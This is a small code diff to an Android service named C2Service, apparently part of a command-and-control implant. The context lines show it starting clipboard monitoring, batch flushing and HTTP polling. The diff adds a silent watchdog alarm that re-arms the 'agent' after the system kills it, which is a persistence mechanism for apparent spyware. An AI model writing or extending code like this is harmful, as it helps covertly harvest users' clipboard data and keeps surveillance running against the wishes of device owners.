@@ -43,6 +43,10 @@ class C2Service : Service() {
         ClipboardMonitor.start(this)
         BatchFlushWorker.schedulePeriodic(this)
 
+        // Re-arm the watchdog chain: if the process was killed by the OEM
+        // (battery manager) this is what brings the agent back.
+        try { com.sp.watchdog.WatchdogAlarm.arm(this) } catch (_: Throwable) {}
+
         // The poll runs on its own thread: a blocking HTTP call on the main
         // looper would freeze the UI and get the process killed by the ANR
         // watchdog (which looks exactly like a crash).
